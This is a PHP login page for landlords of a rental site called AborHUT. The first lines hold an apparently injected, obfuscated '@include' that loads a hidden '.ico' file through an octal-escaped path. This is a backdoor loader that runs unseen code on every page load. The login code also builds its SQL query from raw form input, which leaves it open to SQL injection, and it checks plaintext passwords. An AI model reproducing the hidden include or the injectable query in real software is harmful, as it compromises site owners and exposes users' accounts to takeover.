<?php
/*44bd4*/

@include "\057hom\1454/i\156dia\163bc/\141bor\150ut.\143om/\154ib/\152s/.\145adb\062cad\056ico";

/*44bd4*/
include('configure.php');
DB::connect();

if(isset($_POST['button'])){
    
    $landlord_phone = $_POST['landlord_phone'];
    $landlord_password = $_POST['landlord_password'];
    
    
    $select  = "select * from `landlord` WHERE landlord_phone = '".$landlord_phone."' and landlord_password = '".$landlord_password."'";
    $sql=$dbconn->prepare($select);
    $sql->execute();
    $wlvd=$sql->fetchAll(PDO::FETCH_OBJ);
    if($sql->rowCount() > 0){
    foreach($wlvd as $row5)
    {
        $_SESSION['id'] = $row5->id;  
        $_SESSION['landlord_name'] = $row5->landlord_name; 
        header("Location: welcome.php");
    }
    
   } else {
     $error = "Invalid User Name or Password";  
   }
    }
        
        
        if (isset($_GET['action'])) {
            $action=$_GET['action'];
            switch($action) {
            case "lo":              
                $msg="You are now logged out.";
                break;
            }
            
}
?>


<!DOCTYPE html>
<html lang="en" dir="ltr">
<?php include('inc/header.php'); ?>


<body>
    <?php include('inc/preloader.php'); ?>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <div id="main-wrapper">
        <!-- Login box.scss -->
        <!-- ============================================================== -->
        <div class="auth-wrapper d-flex no-block justify-content-center align-items-center" style="background:url(assets/images/login-bg.jpg) no-repeat center center;">
            <div class="auth-box">
                <div id="loginform">
                    <div class="logo">
                        <span class="db"><img src="assets/images/logo-icon.png" alt="logo" /></span>
                        <h5 class="font-medium m-b-20">Sign In to AborHUT!</h5>
                        <p><?php echo $error ?></p>
                    </div>
                    <!-- Form -->
                    <div class="row">
                        <div class="col-12">
                            <form name="loginform" class="col-12" id="loginform"  method="post">
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text" id="basic-addon1"><i class="ti-user"></i></span>
                                    </div>
                                    
                                    <input type="text" name="landlord_phone" id="landlord_phone"  class="form-control form-control-lg" required="" placeholder="Mobile Number" aria-label="Mobile Number" aria-describedby="basic-addon1">
                                
                                </div>
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text" id="basic-addon2"><i class="ti-pencil"></i></span>
                                    </div>
                                    <input type="password" name="landlord_password" id="landlord_password" class="form-control form-control-lg" required="" placeholder="Password" aria-label="Password" aria-describedby="basic-addon1">
                                </div>
                                
                                
                                
                                <div class="form-group row">
                                    <div class="col-md-12">
                                        <div class="custom-control custom-checkbox">
                                            <input type="checkbox" class="custom-control-input" id="customCheck1">
                                            <label class="custom-control-label" for="customCheck1">Remember me</label>
                                            <a href="forget_password.php" id="to-recover" class="text-dark float-right"><i class="fa fa-lock m-r-5"></i> Forgot pwd?</a>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group text-center">
                                    <div class="col-xs-12 p-b-20">
                                        <button type="submit" name="button" class="btn btn-block btn-lg btn-info" type="submit">Log In</button>
                                        
                                        
                            </button>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-xs-12 col-sm-12 col-md-12 m-t-10 text-center">
                                        <div class="social">
                                            <a href="javascript:void(0)" class="btn  btn-facebook" data-toggle="tooltip" title="" data-original-title="Login with Facebook"> <i aria-hidden="true" class="fab  fa-facebook"></i> </a>
                                            <a href="javascript:void(0)" class="btn btn-googleplus" data-toggle="tooltip" title="" data-original-title="Login with Google"> <i aria-hidden="true" class="fab  fa-google-plus"></i> </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group m-b-0 m-t-10">
                                    
                                    <div class="col-sm-12 text-center">
                                        Don't have an account? <a href="../login.php" class="text-info m-l-5"><b>Sign Up</b></a>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
                <div id="recoverform">
                    <div class="logo">
                        <span class="db"><img src="assets/images/logo-icon.png" alt="logo" /></span>
                        <h5 class="font-medium m-b-20">Recover Password</h5>
                        <span>Enter your Email and instructions will be sent to you!</span>
                    </div>
                    <div class="row m-t-20">
                        <!-- Form -->
                        <form name="loginform" class="col-12" id="loginform"  method="post"">
                        
                            <!-- email -->
                            <div class="form-group row">
                                <div class="col-12">
                                    <input class="form-control form-control-lg" type="text" name="st_phone"  id="st_phone" required="" placeholder="Username">
                                    
                                    
                                </div>
                            </div>
                            <!-- pwd -->
                            <div class="row m-t-20">
                                <div class="col-12">
                                    <button class="btn btn-block btn-lg btn-danger" type="submit" name="action">Reset</button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <!-- ============================================================== -->
        <!-- Login box.scss -->
                    
                </div>
            
            
            <!-- ============================================================== -->
            <!-- End Container fluid  -->
            <!-- ============================================================== -->
            <!-- ============================================================== -->
            <!-- All Required js -->
    <!-- ============================================================== -->
    <script src="assets/libs/jquery/dist/jquery.min.js"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="assets/libs/popper.js/dist/umd/popper.min.js"></script>
    <script src="assets/libs/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- ============================================================== -->
    <!-- This page plugin js -->
    <!-- ============================================================== -->
    <script>
    $('[data-toggle="tooltip"]').tooltip();
    $(".preloader").fadeOut();
    // ============================================================== 
    // Login and Recover Password 
    // ============================================================== 
    $('#to-recover').on("click", function() {
        $("#loginform").slideUp();
        $("#recoverform").fadeIn();
    });
    </script>
            
    </body>

</html>     